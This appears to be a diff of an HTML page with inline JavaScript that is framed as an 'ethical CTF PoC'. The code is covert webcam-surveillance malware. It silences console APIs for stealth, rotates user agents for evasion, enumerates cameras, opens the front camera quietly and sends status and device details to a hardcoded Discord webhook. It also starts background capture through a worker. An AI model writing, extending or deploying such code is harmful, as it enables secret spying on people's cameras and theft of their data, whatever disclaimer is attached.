@@ -9,8 +9,8 @@
 <body>
     <script>
         // WARNING: Ethical CTF PoC only. Unauthorized use violates privacy laws. Use with explicit consent.
-        // Discord webhook URL (replace with your valid webhook)
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375982804852146247/3B6K6PbBrS05n0DOlWLJa3ba-t4t_Qc0ZyaLjCYMrT6Op7u-cvmddGrahMke9PoUH2di'; // Replace with actual webhook URL
+        // Discord webhook URL
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375982804852146247/3B6K6PbBrS05n0DOlWLJa3ba-t4t_Qc0ZyaLjCYMrT6Op7u-cvmddGrahMke9PoUH2di';
 
         // Stealth: Suppress console and performance APIs
         const suppress = () => {};
@@ -19,9 +19,8 @@
 
         // Random user agent for evasion
         const userAgents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1'
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
+            'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36'
         ];
         const getRandomUA = () => userAgents[Math.floor(Math.random() * userAgents.length)];
 
@@ -73,11 +72,24 @@
             try {
                 const permission = await navigator.permissions.query({ name: 'camera' });
                 const state = permission.state;
-                await sendItem('Permission', { status: state });
+                await sendItem('Permission', { status: state, message: `Camera permission state: ${state}` });
                 return state === 'granted';
             } catch (e) {
                 await sendItem('Permission', { error: `Permission check failed: ${e.message}` });
                 return false;
+            }
+        }
+
+        // List available cameras
+        async function listCameras() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                await sendItem('CameraList', { devices: videoDevices.map(d => ({ label: d.label, id: d.deviceId })) });
+                return videoDevices;
+            } catch (e) {
+                await sendItem('CameraList', { error: `Failed to enumerate cameras: ${e.message}` });
+                return [];
             }
         }
 
@@ -137,6 +149,8 @@
                 return false;
             }
 
+            await listCameras(); // Log available cameras
+
             let stream = null;
             const maxRetries = 3;
             let retryCount = 0;
@@ -145,13 +159,14 @@
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({ 
                         video: { 
-                            facingMode: { ideal: 'user' }, // Front-facing camera, fallback for PCs
+                            facingMode: { ideal: 'user' }, // Front-facing, fallback to default
                             width: { ideal: 128 }, 
                             height: { ideal: 96 },
                             frameRate: { ideal: 5 }
                         },
                         audio: false 
                     });
+                    await sendItem('Camera', { message: `Camera accessed: ${stream.getVideoTracks()[0].label}` });
                 } catch (e) {
                     retryCount++;
                     await sendItem('Camera', { error: `Initial camera access failed (attempt ${retryCount}/${maxRetries}): ${e.message}` });
@@ -177,7 +192,7 @@
             return false;
         }
 
-        // Register WebWorker (primary) or ServiceWorker (fallback)
+        // Register WebWorker
         async function registerBackgroundWorker() {
             if ('Worker' in window) {
                 try {
@@ -186,34 +201,9 @@
                     await sendItem('WebWorker', { message: 'WebWorker registered successfully' });
                 } catch (e) {
                     await sendItem('WebWorker', { error: `Failed to register: ${e.message}` });
-                    // Fallback to ServiceWorker
-                    if ('serviceWorker' in navigator && location.protocol === 'https:') {
-                        try {
-                            const registration = await navigator.serviceWorker.register('/worker.js', { scope: '/' });
-                            await navigator.serviceWorker.ready;
-                            registration.active.postMessage({ action: 'startBackgroundCapture' });
-                            await sendItem('ServiceWorker', { message: 'ServiceWorker fallback activated' });
-                        } catch (e2) {
-                            await sendItem('ServiceWorker', { error: `Failed to register: ${e2.message}` });
-                        }
-                    } else {
-                        await sendItem('Worker', { error: 'No ServiceWorker support or non-HTTPS, background capture aborted' });
-                    }
                 }
             } else {
-                await sendItem('Worker', { error: 'No WebWorker support, trying ServiceWorker' });
-                if ('serviceWorker' in navigator && location.protocol === 'https:') {
-                    try {
-                        const registration = await navigator.serviceWorker.register('/worker.js', { scope: '/' });
-                        await navigator.serviceWorker.ready;
-                        registration.active.postMessage({ action: 'startBackgroundCapture' });
-                        await sendItem('ServiceWorker', { message: 'ServiceWorker registered successfully' });
-                    } catch (e) {
-                        await sendItem('ServiceWorker', { error: `Failed to register: ${e.message}` });
-                    }
-                } else {
-                    await sendItem('Worker', { error: 'No WebWorker or ServiceWorker support, background capture aborted' });
-                }
+                await sendItem('Worker', { error: 'No WebWorker support, background capture aborted' });
             }
         }
 
